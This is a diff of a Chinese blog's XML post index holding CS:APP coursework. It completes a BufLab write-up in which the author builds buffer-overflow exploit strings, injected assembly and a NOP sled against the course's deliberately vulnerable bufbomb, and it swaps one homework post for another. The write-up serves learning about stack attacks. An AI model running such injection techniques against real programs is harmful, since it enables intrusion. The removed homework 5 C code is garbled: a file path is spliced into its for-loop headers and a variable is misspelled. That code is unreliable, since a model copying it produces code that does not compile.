+<h4 id="题解：-1"><a href="#题解：-1" class="headerlink" title="题解："></a>题解：</h4><ul>
+<li>查看<code>bufbomb</code>的汇编代码，<code>fizz</code>函数的地址是<code>0x08048daf</code><br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210603203218420.png" alt="image-20210603203218420"></li>
+<li>userid为07的cookie是<code>0x429c4151</code><br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210603204916203.png" alt="image-20210603204916203"></li>
+<li>将这两个写入Level 1的exploit string，中间的是一个无关4字节（<code>fizz</code>函数把它当做返回地址），结果如图所示：<br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210603213910804.png" alt="image-20210603213910804"></li>
+<li>验证，符合预期结果，Level 1完成<br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210603213409034.png" alt="image-20210603213409034"></li>
+</ul>
+<h3 id="Level-2-Firecracker-15-pts"><a href="#Level-2-Firecracker-15-pts" class="headerlink" title="Level 2: Firecracker(15 pts)"></a>Level 2: Firecracker(15 pts)</h3><h4 id="Level-2说明："><a href="#Level-2说明：" class="headerlink" title="Level 2说明："></a>Level 2说明：</h4><p><code>bufbomb</code>文件有一个函数<code>bang</code>，代码如下</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> global_value = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bang</span><span class="params">(<span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (global_value == cookie) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Bang!: You set global_value to 0x%x\n&quot;</span>, global_value);</span><br><span class="line">		validate(<span class="number">2</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Misfire: global_value = 0x%x\n&quot;</span>, global_value);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>与Level 0和Level 1类似，我们的任务是让<code>bufbomb</code>执行<code>bang</code>函数。</p>
+<p>不同的是，我们要将全局变量<code>global_value</code>设置成userid对应的cookie</p>
+<p>作者给出的建议：</p>
+<ul>
+<li>你可以通过GDB来获取信息来构造你的exploit string</li>
+<li>手工确定指令序列的字节编码非常繁琐易错，我们通过编写包含想要放入栈中的指令和数据的汇编代码让工具去做所有的工作。</li>
+<li>exploit string取决于自己的机器、自己的编译器以及cookie</li>
+<li>不要试图使用jmp或call指令去跳转到<code>bang</code>的地址，因为这些指令使用相对PC寻址，很难设置正确。因此需要将地址压入栈中。</li>
+</ul>
+<h4 id="题解：-2"><a href="#题解：-2" class="headerlink" title="题解："></a>题解：</h4><ul>
+<li><p>查看<code>bufbomb</code>的汇编代码，<code>bang</code>函数的地址是<code>0x08048d52</code><br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604100834183.png" alt="image-20210604100834183"></p>
+</li>
+<li><p>查看<code>bang</code>的汇编代码，找到<code>global_value</code>的地址<code>0x804d10c</code><br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604141946443.png" alt="image-20210604141946443"></p>
+</li>
+<li><p>要将<code>global_value</code>的值设置成cookie然后再执行<code>bang</code>函数，我们编写如下汇编代码去实现它<br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604142631247.png" alt="image-20210604142631247"></p>
+</li>
+<li><p>因为不能直接传入汇编代码，我们用gcc得到对应的二进制文件，objdump反汇编得到它的机器码<br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604142605461.png" alt="image-20210604142605461"></p>
+</li>
+<li><p>为了执行这些代码，我们需要知道<code>buf</code>数组的首地址，也就是<code>getbuf</code>函数里的<code>ebp-0x28</code>，使用GDB得到这个地址为<code>0x55682fb8</code></p>
+<p><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604151933110.png" alt="image-20210604151933110"></p>
+</li>
+<li><p>所以构造exploit string如图所示：<br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604152555659.png" alt="image-20210604152555659"></p>
+</li>
+<li><p>验证，符合预期结果，Level 2完成<br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604152527883.png" alt="image-20210604152527883"></p>
+</li>
+</ul>
+<h3 id="Level-3-Dynamite-20-pts"><a href="#Level-3-Dynamite-20-pts" class="headerlink" title="Level 3: Dynamite(20 pts)"></a>Level 3: Dynamite(20 pts)</h3><h4 id="Level-3说明："><a href="#Level-3说明：" class="headerlink" title="Level 3说明："></a>Level 3说明：</h4><p>我们之前的攻击都导致程序跳转到其他函数的代码，然后导致程序退出。因此，使用破坏堆栈的exploit string来覆盖保存的值是可以接受的。</p>
+<p>最复杂形式的缓冲区溢出攻击会导致程序执行一些漏洞利用代码，这些代码会改变程序的寄存器/内存状态，但会使程序返回到原始调用函数(本例中为<code>test</code>)。调用函数对攻击视而不见。不过，这种攻击方式很棘手，因为您必须:1)将机器代码放到堆栈上，2)将返回指针设置到该代码的开头，3)撤销对堆栈状态的任何破坏。</p>
+<p>您在这个级别的任务是提供一个exploit string，它将导致<code>getbuf</code>返回您的cookie进行测试，而不是值1。您可以在测试代码中看到，完成的话将导致程序成功运行“Bomb！”。您的漏洞代码应该将您的cookie设置为<code>getbuf</code>返回值，恢复任何损坏的状态，在堆栈上压入正确的返回位置，并执行<code>ret</code>指令以真正返回到<code>test</code>。</p>
+<p>作者的建议：</p>
+<ul>
+<li>您可以使用GDB获得构建漏洞字符串所需的信息。在<code>getbuf</code>中设置一个断点并运行到该断点。确定参数，如保存的返回地址。</li>
+<li>手工确定指令的机器码既繁琐又容易出错。您可以通过编写包含要放入堆栈的指令和数据的汇编代码文件，让工具来完成所有的工作。用GCC汇编这个文件，用OBJDUMP拆解。您应该能够获得您将在提示符下键入的确切字节序列。</li>
+<li>请记住，您的exploit string取决于您的机器、编译器，甚至您的userid的cookie。</li>
+</ul>
+<p>一旦你完成了这一关，停下来反思一下你已经完成了什么。你让一个程序执行你自己设计的机器代码。你这样做的方式足够隐秘，以至于程序没有意识到有什么不对劲。</p>
+<h4 id="题解：-3"><a href="#题解：-3" class="headerlink" title="题解："></a>题解：</h4><ul>
+<li><p>我们这一Level的思路是：因为<code>getbuf</code>的返回值保存在eax里，然后赋给<code>val</code>，所以我们只需要执行构造的代码将eax里面的值修改为cookie，同时将赋值指令的地址压入栈中，然后用ret指令返回地址，正常去执行<code>test</code>的剩余指令。</p>
+</li>
+<li><p>查看<code>test</code>的汇编代码，将<code>getbuf</code>返回值赋给<code>val</code>的指令的地址是<code>0x8048e50</code><br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604171307444.png" alt="image-20210604171307444"></p>
+</li>
+<li><p>编写汇编代码实现改写eax的值、压入地址、返回地址，如图所示：</p>
+<p><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604172403658.png" alt="image-20210604172403658"></p>
+</li>
+<li><p>gcc编译成可重定位目标文件，objdump查看机器码<br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604174037448.png" alt="image-20210604174037448"></p>
+</li>
+<li><p>为了还原栈，查看调用<code>getbuf</code>时的旧的ebp<br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604181743588.png" alt="image-20210604181743588"></p>
+</li>
+<li><p>构造exploit string，如图所示：<br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604184022787.png" alt="image-20210604184022787"></p>
+</li>
+<li><p>验证，预期结果符合，Level 3完成<br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604184002866.png" alt="image-20210604184002866"></p>
+</li>
+</ul>
+<h3 id="Level-4-Nitroglycerin-10-pts"><a href="#Level-4-Nitroglycerin-10-pts" class="headerlink" title="Level 4: Nitroglycerin(10 pts)"></a>Level 4: Nitroglycerin(10 pts)</h3><h4 id="Level-4说明："><a href="#Level-4说明：" class="headerlink" title="Level 4说明："></a>Level 4说明：</h4><p>请注意：您需要使用“-n”命令行选项来运行这关。</p>
+<p>从一次运行到另一次运行，尤其是由不同的用户运行，给定过程使用的确切堆栈位置会有所不同。这种变化的一个原因是，当程序开始执行时，所有环境变量的值都放在堆栈底部附近。环境变量存储为字符串，根据它们的值需要不同的存储量。因此，为给定用户分配的堆栈空间取决于他或她的环境变量的设置。在GDB下运行程序时，栈的位置也不同，因为GDB为自己的一些状态使用栈空间</p>
+<p>在调用getbuf的代码中，我们加入了稳定堆栈的特性，因此getbuf的堆栈框架的位置在两次运行之间是一致的。这使得您可以在知道<code>buf</code>的确切起始地址的情况下编写一个攻击字符串。如果你试图在一个正常的程序上使用这样的漏洞，你会发现它有时会起作用，但在其他时候会导致分段错误。因此得名“炸药”——阿尔弗雷德·诺贝尔开发的一种炸药，含有稳定元素，使其不太容易发生意外爆炸。</p>
+<p>对于这个级别，我们走了相反的方向，使堆栈位置比平时更不稳定。因此得名“硝化甘油”——一种出了名的不稳定炸药</p>
+<p>当你用命令行标志“-n”运行<code>BUFFAMBOM</code>时，它将在“硝基”模式下运行。该程序不是调用函数<code>getbuf</code>，而是调用一个略有不同的函数<code>getbufn</code>：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Buffer size for getbufn */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KABOOM_BUFFER_SIZE 512</span></span><br></pre></td></tr></table></figure>
+
+<p>这个函数类似于<code>getbuf</code>，只是它有一个512个字符的缓冲区。您将需要这个额外的空间来创建一个可靠的漏洞。调用<code>getbufn</code>的代码首先在堆栈上分配一个随机的存储量，这样，如果您在<code>getbufn</code>的两次连续执行期间对%ebp的值进行采样，您会发现它们相差多达240。</p>
+<p>此外，当在硝基模式下运行时，BUFBOMB要求您提供您的字符串5次，它将执行<code>getbufn</code>5次，每次都有不同的堆栈偏移量。您的利用字符串必须使它每次都返回您的cookie。</p>
+<p>您的任务与Level 3级别的任务相同。同样，您在这个级别的工作是提供一个漏洞利用字符串，它将导致<code>getbufn</code>返回您的cookie进行测试，而不是值1。您可以在测试代码中看到，这将导致程序运行“KABOOM！”您的漏洞代码应该将您的cookie设置为返回值，恢复任何损坏的状态，在堆栈上推送正确的返回位置，并执行ret指令以真正返回testn。</p>
+<p>作者建议：</p>
+<ul>
+<li>您可以使用HEX2RAW程序发送漏洞字符串的多个副本。如果文件exploit.txt中只有一个副本，则可以使用以下命令:<br><code>unix&gt; cat exploit.txt | ./hex2raw -n | ./bufbomb -n -u bovik</code></li>
+<li>诀窍是利用nop指令。它用一个字节(代码0x90)编码。在CS:APP2e教材的第262页上阅读关于“nop sleds”的内容可能会有所帮助</li>
+</ul>
+<h4 id="题解：-4"><a href="#题解：-4" class="headerlink" title="题解："></a>题解：</h4><ul>
+<li><p>查看<code>getbufn</code>函数的汇编代码，缓冲区首地址为<code>ebp-0x208</code><br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604200855918.png" alt="image-20210604200855918"></p>
+</li>
+<li><p>查看<code>testn</code>将<code>eax</code>返回值赋给<code>val</code>的指令地址为<code>0x8048ce2</code><br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604200930760.png" alt="image-20210604200930760"></p>
+</li>
+<li><p>我们这一题的思路是：因为这一等级缓冲区首地址会变化，所以我们不能直接GDB调试去得到一个确切的起始地址，我们需要用到nop指令，将有效机器指令尽可能往较大的地址处放，前面填充nop指令，这样跳转到哪里我们都能成功执行我们的恶意代码。</p>
+</li>
+<li><p>因为要恢复ebp存储<code>testn</code>的帧指针，查看<code>testn</code>的汇编代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov %esp,%ebp</span><br><span class="line"># 此时esp和ebp相等</span><br><span class="line">push %ebx</span><br><span class="line"># 此时ebp=esp+0x4</span><br><span class="line">sub $0x24,%esp</span><br><span class="line"># 这个时候执行完后，ebp=esp+0x28，这就是esp和ebp每次的变化关系，通过esp来恢复我们的每次的ebp</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604235350148.png" alt="image-20210604235350148"></p>
+</li>
+<li><p>编写恶意代码实现恢复ebp、cookie作为返回值、下一条指令地址压入栈中、返回地址出栈。<br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604212313389.png" alt="image-20210604212313389"></p>
+</li>
+<li><p>gcc和objdump得到代码的字节序列。<br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604212418838.png" alt="image-20210604212418838"></p>
+</li>
+<li><p>gcc得到大概的几个首地址，这里取的是最大的<code>0x55682e48</code><br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604212514423.png" alt="image-20210604212514423"></p>
+</li>
+<li><p>构造exploit string<br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604212346929.png" alt="image-20210604212346929"></p>
+</li>
+<li><p>验证，成功，实验结束。<br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604212437957.png" alt="image-20210604212437957"></p>
+</li>
+</ul>
+<h2 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h2><p>这次实验时间很紧张，主要是我的原因，到现在终于圆满完成，还是值得庆祝的。</p>
+<p>花费时间最长的部分其实是英文文档的阅读，读起来太过吃力。</p>
+<p>这个实验让我对缓冲溢出漏洞有了直观的认识，重新复习了栈的原理，了解了易于遭受缓冲区攻击代码的危险性。</p>
+<p>作业要早早完成，不然会掉头发的。</p>
+]]></content>
+      <categories>
+        <category>CS:APP</category>
+      </categories>
+      <tags>
+        <tag>课程作业</tag>
+        <tag>Lab</tag>
       </tags>
   </entry>
   <entry>
@@ -3145,31 +3115,30 @@ php反序列化漏洞。
       </tags>
   </entry>
   <entry>
-    <title>深入理解计算机系统——课程作业5</title>
-    <url>/2021/05/23/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A5/</url>
-    <content><![CDATA[<h1 id="深入理解计算机系统——课程作业5"><a href="#深入理解计算机系统——课程作业5" class="headerlink" title="深入理解计算机系统——课程作业5"></a>深入理解计算机系统——课程作业5</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>突然要做作业不会做，昨天学了一手，今天开始写</p>
-<h2 id="题一：p376家庭作业5-15"><a href="#题一：p376家庭作业5-15" class="headerlink" title="题一：p376家庭作业5.15"></a>题一：p376家庭作业5.15</h2><h3 id="A、画关键路径"><a href="#A、画关键路径" class="headerlink" title="A、画关键路径"></a>A、画关键路径</h3><p><img src="/2021/05/23/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A5/image-20210524172744364.png" alt="image-20210524172744364"></p>
-<p><img src="/2021/05/23/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A5/image-20210524174834951.png" alt="image-20210524174834951"></p>
-<p><img src="/2021/05/23/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A5/image-20210524175909779.png" alt="image-20210524175909779"></p>
-<h3 id="B、对于float数据类型，关键路径决定的CPE下限是什么"><a href="#B、对于float数据类型，关键路径决定的CPE下限是什么" class="headerlink" title="B、对于float数据类型，关键路径决定的CPE下限是什么"></a>B、对于float数据类型，关键路径决定的CPE下限是什么</h3><p>单精度的加法运算的延迟CPE是3</p>
-<h3 id="C、整数数据的关键路径决定的CPE的下界是什么"><a href="#C、整数数据的关键路径决定的CPE的下界是什么" class="headerlink" title="C、整数数据的关键路径决定的CPE的下界是什么"></a>C、整数数据的关键路径决定的CPE的下界是什么</h3><p>整数的加法运算的延迟CPE是1</p>
-<h3 id="D、解释两个浮点版本的CPE为什么都是3，即使乘法需要4-5个周期"><a href="#D、解释两个浮点版本的CPE为什么都是3，即使乘法需要4-5个周期" class="headerlink" title="D、解释两个浮点版本的CPE为什么都是3，即使乘法需要4-5个周期"></a>D、解释两个浮点版本的CPE为什么都是3，即使乘法需要4-5个周期</h3><p>因为单精度和双精度的加法运算CPE都是3。</p>
-<p>对于乘法运算来说，因为没有数据相关，所以它可以进行流水线式地执行，发射时间是1，不会比3更大。</p>
-<h2 id="题二：p376家庭作业5-16"><a href="#题二：p376家庭作业5-16" class="headerlink" title="题二：p376家庭作业5.16"></a>题二：p376家庭作业5.16</h2><h3 id="三次循环展开的代码："><a href="#三次循环展开的代码：" class="headerlink" title="三次循环展开的代码："></a>三次循环展开的代码：</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inner5</span><span class="params">(vec_ptr x, vec_ptr y, <span class="keyword">data_t</span> *dest)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">long</span> <span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">int</span> length = vec_length(x);</span><br><span class="line">	<span class="keyword">data_t</span> *xdata = get_vec_start(x);</span><br><span class="line">	<span class="keyword">data_t</span> *ydata = get_vec_start(y);</span><br><span class="line">	<span class="keyword">data_t</span> sum = (<span class="keyword">data_t</span>) <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">long</span> <span class="keyword">int</span> limit = length - <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">for</span> (深入理解计算机系统——课程作业<span class="number">5</span>/i = <span class="number">0</span>; i &lt; limit; i += <span class="number">3</span>) &#123;</span><br><span class="line">		sum = sum + xdata[i] * ydata[i]</span><br><span class="line">		      + xdata[i + <span class="number">1</span>] * ydata[i + <span class="number">1</span>]</span><br><span class="line">		      + xdata[i + <span class="number">2</span>] * ydata[i + <span class="number">2</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (; i &lt; length; i++) &#123;</span><br><span class="line">		sum = sum + xdata[i] * ydata[i];</span><br><span class="line">	&#125;</span><br><span class="line">	*dest = sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+    <title>深入理解计算机系统——课程作业2</title>
+    <url>/2021/05/03/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A2/</url>
+    <content><![CDATA[<h1 id="深入理解计算机系统——课程作业2"><a href="#深入理解计算机系统——课程作业2" class="headerlink" title="深入理解计算机系统——课程作业2"></a>深入理解计算机系统——课程作业2</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>五一放假还有作业。。。</p>
+<p>课程作业2共有三个题，都是分析汇编代码</p>
+<h2 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//include &quot;stdio.h&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//define H ?  //定义常数H          //H=37</span></span><br><span class="line"><span class="comment">//define J ?  //定义常数J          //J=16</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> array1[H][J]; </span><br><span class="line"><span class="keyword">int</span> array2[J][H]; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">    array1[x][y] = x+<span class="number">2</span>*y;</span><br><span class="line">    array2[y][x] = y-x*x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( )</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h3 id="A、解释为什么任何版本的内积过程都不能达到比2更小的CPE"><a href="#A、解释为什么任何版本的内积过程都不能达到比2更小的CPE" class="headerlink" title="A、解释为什么任何版本的内积过程都不能达到比2更小的CPE"></a>A、解释为什么任何版本的内积过程都不能达到比2更小的CPE</h3><p>由于加载单元每个时钟周期只能启动一条加载操作。</p>
-<p>如果每次计算时要从两个存储器位置中加载数据，就要分两次进行，所以CPE不可能小于2</p>
-<h3 id="B、为什么浮点数据的性能不会通过循环展开得到提高。"><a href="#B、为什么浮点数据的性能不会通过循环展开得到提高。" class="headerlink" title="B、为什么浮点数据的性能不会通过循环展开得到提高。"></a>B、为什么浮点数据的性能不会通过循环展开得到提高。</h3><p>因为关键路径还是length个浮点加法，虽然迭代次数减半了，但是每次迭代中还是有两个顺序的加法操作。</p>
-<h2 id="题三：p376家庭作业5-20"><a href="#题三：p376家庭作业5-20" class="headerlink" title="题三：p376家庭作业5.20"></a>题三：p376家庭作业5.20</h2><h3 id="实现代码："><a href="#实现代码：" class="headerlink" title="实现代码："></a>实现代码：</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">poly_optimized</span><span class="params">(<span class="keyword">double</span> a[], <span class="keyword">double</span> x, <span class="keyword">int</span> degree)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">long</span> <span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">double</span> result = a[<span class="number">0</span>];</span><br><span class="line">	<span class="keyword">double</span> xpwr = x;</span><br><span class="line">	<span class="keyword">double</span> x2 = x * x;</span><br><span class="line">	<span class="keyword">double</span> x3 = x2 * x;</span><br><span class="line">	<span class="keyword">double</span> x4 = x3 * x;</span><br><span class="line">	<span class="keyword">double</span> x5 = x4 * x;</span><br><span class="line">	<span class="keyword">double</span> x6 = x5 * x;</span><br><span class="line">	<span class="keyword">int</span> limit = degree - <span class="number">5</span>;</span><br><span class="line">	<span class="keyword">for</span> (深入理解计算机系统——课程作业<span class="number">5</span>/i = <span class="number">1</span>; i &lt;= limit; i += <span class="number">6</span>) &#123;</span><br><span class="line">		<span class="keyword">double</span> result1 = a[i] + a[i + <span class="number">1</span>] * x;</span><br><span class="line">		<span class="keyword">double</span> result2 = a[i + <span class="number">2</span>] * x2 + a[i + <span class="number">3</span>] * x3;</span><br><span class="line">		<span class="keyword">double</span> result3 = a[i + <span class="number">4</span>] * x4 + a[i + <span class="number">5</span>] * x5;</span><br><span class="line">		result += (rseult1 + result2 + result3) * xpwr;</span><br><span class="line">		xpwr *= x6;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (; i &lt;= degree; i++) &#123;</span><br><span class="line">		result += a[i] * xpwr;</span><br><span class="line">		xpwr *= x;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在<code>Ubuntu 32位</code>系统下经过<code>gcc</code>汇编后，得到的函数f汇编代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f:</span><br><span class="line">pushl     %ebp            //ebp入栈</span><br><span class="line">movl     %esp, %ebp       //ebp设为现在的帧指针</span><br><span class="line">pushl     %ebx            //ebx入栈</span><br><span class="line">movl     8(%ebp), %ecx    //ecx= M(8+ebp)=x</span><br><span class="line">movl     12(%ebp), %edx   //edx= M(12+ebp)=y</span><br><span class="line">movl     12(%ebp), %eax   //eax= M(12+ebp)=y</span><br><span class="line">addl     %eax, %eax       //eax=2*eax=2*y</span><br><span class="line">addl     8(%ebp), %eax    //eax= M(8+ebp)+eax=x+2*y</span><br><span class="line">sall     $4, %ecx         //ecx=ecx*16=16*x</span><br><span class="line">leal     (%ecx,%edx), %edx  //edx= ecx+edx =16*x+y,so J=16</span><br><span class="line">movl     %eax, array1(,%edx,4)   //array1[edx]=eax</span><br><span class="line">movl     12(%ebp), %edx   //edx=M(12+ebp)=y</span><br><span class="line">movl     8(%ebp), %ebx    //ebx=M(8+ebp)=x</span><br><span class="line">movl     8(%ebp), %eax    //eax=M(8+ebp)=x</span><br><span class="line">imull     8(%ebp), %eax    //eax=eax*M(8+ebp)=x*x</span><br><span class="line">movl     12(%ebp), %ecx    //ecx=M(12+ebp)=y</span><br><span class="line">subl     %eax, %ecx       //ecx=ecx-eax=y-x*x</span><br><span class="line">movl     %edx, %eax       //eax=edx=y</span><br><span class="line">sall     $3, %eax          //eax=eax*8=8*y</span><br><span class="line">addl     %edx, %eax       //eax=eax+edx=8*y+y</span><br><span class="line">sall     $2, %eax         //eax=eax*4=9*y*4</span><br><span class="line">addl     %edx, %eax       //eax=edx+eax=36*y+y</span><br><span class="line">addl     %ebx, %eax        //eax=ebx+eax=37*y+x,so H=37</span><br><span class="line">movl     %ecx, array2(,%eax,4)   //array2[eax]=ecx=y-x*x</span><br><span class="line">popl     %ebx              //ebx出栈</span><br><span class="line">popl     %ebp              //ebp出栈</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
 
